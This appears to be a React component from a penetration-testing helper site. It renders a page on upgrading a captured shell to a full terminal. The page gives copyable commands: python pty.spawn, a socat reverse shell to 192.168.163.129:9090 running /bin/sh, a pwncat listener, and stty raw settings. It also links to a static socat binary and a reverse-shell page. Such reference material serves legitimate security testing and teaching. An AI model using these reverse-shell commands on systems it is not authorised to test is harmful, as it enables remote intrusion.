import React from 'react';
import { Typography, Divider, Collapse } from 'antd';
// i18n
import '../../i18n';
import { useTranslation } from 'react-i18next';
//

const { Title, Paragraph, Text, Link } = Typography;
const { Panel } = Collapse;
export default function TTY() {
    const { t } = useTranslation();
    const py_tty_command = `$(which python python2 python3 | head -n 1) -c 'import pty;pty.spawn("/bin/bash")'`;
    const socat_tty_command = `socat TCP:192.168.163.129:9090 EXEC:'/bin/sh',pty,stderr,setsid,sigint,sane`;
    const imageStyle = {
        maxWidth: '100%', // 图片最大宽度为100%
    };
    return (
        <div>
            <div>
                <Title level={2} style={{ fontWeight: 'bold', margin: 15 }}>
                    {t('tty_title')}
                </Title>
                <Paragraph style={{ margin: 15 }}>
                    {t('tty_desc')}
                </Paragraph>
                <Divider />
                <div
                    style={{
                        padding: 6,
                    }}
                >
                    <Title level={4} style={{ margin: 8 }}>{t('tty_solution1')}</Title>
                    <Paragraph>{t('tty_solution1_use')}</Paragraph>
                    <Paragraph>
                        <pre>
                            <Text copyable>
                                python3 -c 'import pty;pty.spawn("/bin/bash")'
                            </Text>
                        </pre>
                    </Paragraph>
                    Or
                    <Paragraph>
                        <pre>
                            <Text copyable>
                                {py_tty_command}
                            </Text>
                        </pre>
                    </Paragraph>
                </div>

                <div
                    style={{
                        padding: 6,
                    }}
                >
                    <Title level={4} style={{ margin: 8 }}>{t('tty_solution2')}</Title>
                    <Paragraph>- {t('tty_solution2_getbin')}: <Link href='https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat' target='_blank'>Download Socat</Link></Paragraph>
                    <Paragraph>- {t('tty_solution2_getcmd')}: <Link href='./RevShell#name=socat+%232+%28TTY%29' target='_blank'>Socat Reverse Shell</Link></Paragraph>
                    <Paragraph>
                        <pre>
                            <Text copyable>
                                {socat_tty_command}
                            </Text>
                        </pre>
                    </Paragraph>
                </div>

                <div
                    style={{
                        padding: 6,
                    }}
                >
                    <Title level={4} style={{ margin: 8 }}>{t('tty_solution3')}</Title>
                    <Paragraph>{t('tty_solution3_getbin')}:</Paragraph>
                    <Paragraph>
                        <pre>
                            <Text copyable>
                                pip install pwncat-cs
                            </Text>
                        </pre>
                    </Paragraph>
                    <Paragraph>{t('tty_solution3_use')}:</Paragraph>
                    <Paragraph>
                        <pre>
                            <Text copyable>
                                python -m pwncat -lp 9090
                            </Text>
                        </pre>
                    </Paragraph>
                    <Paragraph>{t('tty_solution3_shell')}:</Paragraph>
                    <Paragraph>
                        <pre>
                            <Text copyable>
                                {`back\nor press 'Ctrl + D'`}
                            </Text>
                        </pre>
                    </Paragraph>
                    <Paragraph>{t('tty_solution3_tty')}</Paragraph>
                </div>
                <Collapse defaultActiveKey={['0']}>
                    <Panel header={t('php_webshell_preview')} key='1'>
                        <div style={{display: 'flex', justifyContent: 'center', alignItems: 'center'}}>
                            <img
                                src='./img/Snipaste_2024-05-18_13-20-59.png'
                                style={imageStyle}
                            />
                        </div>
                    </Panel>
                </Collapse>


                <Divider />
                <div
                    style={{
                        padding: 6,
                    }}>
                    <Title level={4} style={{ margin: 8 }}>{t('tty_autocomp')}</Title>
                    <Paragraph>
                        <pre>
                            <Text copyable>
                                export TERM=xterm
                            </Text>
                        </pre>
                    </Paragraph>
                    <Paragraph>
                        <strong>{t('tty_background')}</strong>
                        <pre>
                            <Text>
                                Press 'Ctrl + Z'
                            </Text>
                        </pre>
                        {t('tty_background1')}
                        <pre>
                            <Text copyable>
                                {`stty raw -echo; fg\nstty rows 38 columns 116`}
                            </Text>
                        </pre>
                        {t('tty_background2')}
                    </Paragraph>
                </div>
            </div>
        </div>
    );
}
